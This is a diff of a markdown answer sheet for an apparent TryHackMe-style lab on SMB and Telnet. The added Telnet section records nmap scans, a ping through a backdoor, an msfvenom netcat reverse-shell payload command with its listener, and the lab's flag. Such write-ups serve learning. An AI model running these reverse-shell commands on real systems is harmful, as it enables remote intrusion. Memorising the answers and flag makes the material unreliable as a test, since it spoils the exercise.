@@ -28,7 +28,6 @@
   a. profiles. Out of all the shares listed under share enumeraiton, profiles suggest we might be able to find user credentials to infiltrate the network.
 ```
 
-
 ## Exploting SMB
 ```
 1. What would be the correct syntax to access an SMB share called "secret" as user "suit" on a machine with the IP 10.10.10.2 on the default port?
@@ -62,10 +61,39 @@ Now, use the information you have already gathered to work out the username of t
   a. Encryption
 ```
   
-
 ## Enumerating Telnet
+```
+1. How many ports are open on the target machine?
+  a. 1 - Found using command 'nmap -sS -vv -p- <target ip>'
+2. What port is this?
+  a. 8012 - Found with the above command.
+3. This port is unassigned, but still lists the protocol it's using, what protocol is this?
+  a. tcp - Found with the above command.
+4. Now re-run the nmap scan, without the -p- tag, how many ports show up as open?
+  a. 0 - Found using command 'nmap -sS -vv <target ip>'. Since the open port is above 1000 it is not checked.
+5. Based on the title returned to us, what do we think this port could be used for?
+  a. a backdoor - Used command 'telnet <target ip> 8012' to connect to the remote server.
+6. Who could it belong to? Gathering possible usernames is an important step in enumeration.
+  a. Skidy - The output is "SKIDY'S BACKDOOR".
+```
 
 ## Exploting Telnet
+```
+1. Great! It's an open telnet connection! What welcome message do we receive?
+  a. SKIDY'S BACKDOOR.
+2. Let's try executing some commands, do we get a return on any input we enter into the telnet session? (Y/N)
+  a. N
+3. Start a tcpdump listener on your local machine. Command: 'sudo tcpdump ip proto \\icmp -i ens5'. This starts a tcpdump listener, specifically listening for ICMP traffic, which pings operate on.
+4. Now, use the command "ping [local THM ip] -c 1" through the telnet session to see if we're able to execute system commands. Do we receive any pings? Note, you need to preface this with .RUN (Y/N)
+  a. Y. Used the command '.RUN ping <attackbox ip> -c 1' in the telnet terminal.
+5. We're going to generate a reverse shell payload using msfvenom. This will generate and encode a netcat reverse shell for us. What word does the generated payload start with?
+  a. mkfifo - Used the command 'msfvenom -p cmd/unix/reverse_netcat lhost=<attackbox ip> lport=4444 R'.
+6. Perfect. We're nearly there. Now all we need to do is start a netcat listener on our local machine. What would the command look like for the listening port we selected in our payload?
+  a. nc -lvp 4444
+7. Great! Now that's running, we need to copy and paste our msfvenom payload into the telnet session and run it as a command. Hopefully- this will give us a shell on the target machine! Success! What is the contents of flag.txt?
+  a. THM{y0u_g0t_th3_t3ln3t_fl4g}
+
+```
 
 ## Understanding FTP
 
